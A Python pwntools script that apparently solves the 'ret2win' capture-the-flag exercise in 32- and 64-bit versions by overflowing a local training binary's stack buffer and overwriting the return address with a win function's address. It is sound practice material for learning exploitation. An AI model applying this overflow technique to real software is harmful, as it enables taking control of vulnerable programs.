#!/usr/bin/python3

from pwn import *
import sys

def first_binary(): #x32 binary

	binary = './ret2win32' #Name
	io = process(binary) #Start a process
	context.log_level = 'info' 

	eip_offset = 44 #Eip offset until we overwrite it
	ret2win = 0x0804862c #Ret2win function address

	payload = b'a' * eip_offset + p32(ret2win)

	io.recvuntil('> ')
	io.sendline(payload)
	print(io.recv())
	print(io.recv())

	io.close()
	return True

def second_binary(): #x64 binary

	binary = './ret2win' #Name
	io = process(binary) #Start a process
	context.log_level = 'info' 

	rsp_offset = 40 #Rsp offset until we overwrite it
	ret2win = 0x400756 #Ret2win function address

	payload = b'a' * rsp_offset + p64(ret2win)

	io.recvuntil('> ')
	io.sendline(payload)
	print(io.recv())
	print(io.recv())

	io.close()
	return True

if sys.argv[1] == "32":
	first_binary()
elif sys.argv[1] == "64":
	second_binary()
else:
	print("Please enter 32 or 64")
